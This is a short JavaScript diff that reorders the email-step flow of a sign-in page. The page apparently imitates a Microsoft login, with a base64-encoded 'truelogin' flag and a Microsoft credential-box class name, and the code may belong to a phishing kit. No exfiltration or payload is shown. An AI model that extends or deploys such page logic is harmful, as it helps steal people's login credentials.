@@ -14,11 +14,10 @@ getpage('EmailPage',0);
 email = $("#email").val(semail);
 if(ltype=='dHJ1ZWxvZ2lu'){
  skip=0;
-nextto(semail);
 }else{
 skip=1;
-nextto(semail);
 }
+nextto(semail);
 }else{
  await getpage('EmailPage',1);  
   if(semail){
@@ -80,6 +79,7 @@ $("#btn").attr("disabled", false);
 $(".ext-promoted-fed-cred-box").hide();
 });
 } else {
+   await getpage('EmailPage',0);
     $("#load").hide();
 $("#error1").html(Errs['Notemail']);
 }
